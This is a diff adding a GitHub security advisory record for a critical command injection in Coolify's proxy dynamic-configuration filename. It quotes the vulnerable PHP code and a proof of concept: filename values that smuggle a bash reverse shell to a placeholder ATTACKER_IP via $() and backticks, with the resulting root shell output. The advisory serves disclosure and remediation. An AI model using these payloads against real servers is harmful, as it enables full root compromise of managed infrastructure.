@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-q7rg-2j7p-83gp",
+  "repo": {
+    "cve_id": "CVE-2025-66212",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nAn authenticated command injection vulnerability in the Dynamic Proxy Configuration functionality allows users with server management permissions to execute arbitrary commands as root on managed servers. The fileName parameter is passed directly to shell commands without sanitization, enabling full remote code execution on the host system.\r\n\r\n### Details\r\nVulnerable File: app/Livewire/Server/Proxy/NewDynamicConfiguration.php\r\nVulnerable Code (lines 68-83):\r\n```\r\n$proxy_path = $this->server->proxyPath();\r\n$file = \"{$proxy_path}/dynamic/{$this->fileName}\";\r\nif ($this->newFile) {\r\n    $exists = instant_remote_process([\"test -f $file && echo 1 || echo 0\"], $this->server);\r\n    if ($exists == 1) {\r\n        $this->dispatch('error', 'File already exists');\r\n        return;\r\n    }\r\n}\r\n// ...\r\n$base64_value = base64_encode($this->value);\r\ninstant_remote_process([\r\n    \"echo '{$base64_value}' | base64 -d | tee {$file} > /dev/null\",\r\n], $this->server);\r\n\r\n```\r\n\r\n\r\nThe $this->fileName parameter undergoes only basic validation ('fileName' => 'required') at line 44, with no shell metacharacter filtering or use of escapeshellarg(). When concatenated into shell commands executed via instant_remote_process(), attackers can inject arbitrary commands using command substitution ($(...)) or other shell metacharacters.\r\nAdditionally, app/Livewire/Server/Proxy/DynamicConfigurationNavbar.php line 34 contains the same vulnerability in the delete function:\r\n\r\n```\r\n$file = str_replace('|', '.', $fileName);\r\ninstant_remote_process([\"rm -f {$proxy_path}/dynamic/{$file}\"], $this->server);\r\n```\r\nThe str_replace('|', '.') only replaces pipe characters, leaving command substitution and other injection vectors unmitigated.\r\nDue to Coolify's sudo injection mechanism in bootstrap/helpers/sudo.php, which automatically prepends sudo to command substitutions, all injected commands execute with root privileges regardless of the SSH user configuration.\r\n\r\n\r\n### PoC\r\nPrerequisites:\r\n\r\nCoolify v4.0.0-beta.450 or earlier\r\nAuthenticated user with server management permissions\r\nA configured server with proxy (Traefik or Caddy)\r\n\r\nSteps to reproduce:\r\n\r\nStart a netcat listener on attacker machine:\r\n\r\nnc -lvnp 9999\r\n```\r\n\r\n2. Log into Coolify and navigate to:\r\n   `Servers → [Your Server] → Proxy → Dynamic Configurations`\r\n\r\n3. Click \"+ Add\" to create a new dynamic configuration\r\n\r\n4. Enter the following:\r\n   - **Filename:** `test$(bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1)`\r\n   - **Content:** `# test configuration`\r\n\r\n5. Click Save\r\n\r\n6. A root shell is received on the attacker's listener:\r\n```\r\nconnect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 40192\r\nbash: cannot set terminal process group: Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nroot@hostname:~#\r\n```\r\n\r\n**Alternative payload using backticks:**\r\n```\r\ntest`bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1`\r\n\r\n\r\n\r\n### Impact\r\nRemote Code Execution: Attackers can execute arbitrary commands on managed servers\r\nRoot Privilege: All commands execute as root due to Coolify's sudo injection mechanism\r\nFull Server Compromise: Attackers gain complete control of managed infrastructure\r\nContainer Escape: Access to Docker socket (/var/run/docker.sock) enables container escape and control of all containers\r\nLateral Movement: Compromised servers can be used to attack other managed resources\r\nData Breach: Access to all databases, applications, and secrets managed by Coolify\r\n\r\nWho is affected:\r\n\r\nAll Coolify self-hosted instances running v4.0.0-beta.450 or earlier\r\nAny organization using Coolify to manage server infrastructure\r\nAll servers connected to a compromised Coolify instance\r\n\r\n\r\nRecommended Fix:\r\nApply escapeshellarg() to the $fileName parameter before use in shell commands:\r\n\r\n```\r\n$escapedFileName = escapeshellarg($this->fileName);\r\n$file = \"{$proxy_path}/dynamic/{$escapedFileName}\";\r\n\r\n```\r\n\r\n\r\nAdditionally, implement input validation to restrict filenames to alphanumeric characters, dots, dashes, and underscores only.\r\n\r\n\r\n",
+    "ghsa_id": "GHSA-q7rg-2j7p-83gp",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-q7rg-2j7p-83gp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-q7rg-2j7p-83gp"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-66212"
+      }
+    ],
+    "published_at": "2026-01-03T15:13:18Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Dynamic Proxy Configuration Filename",
+    "updated_at": "2026-01-03T15:13:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": ">= 4.0.0-beta.451",
+        "vulnerable_version_range": "<= 4.0.0-beta.450"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
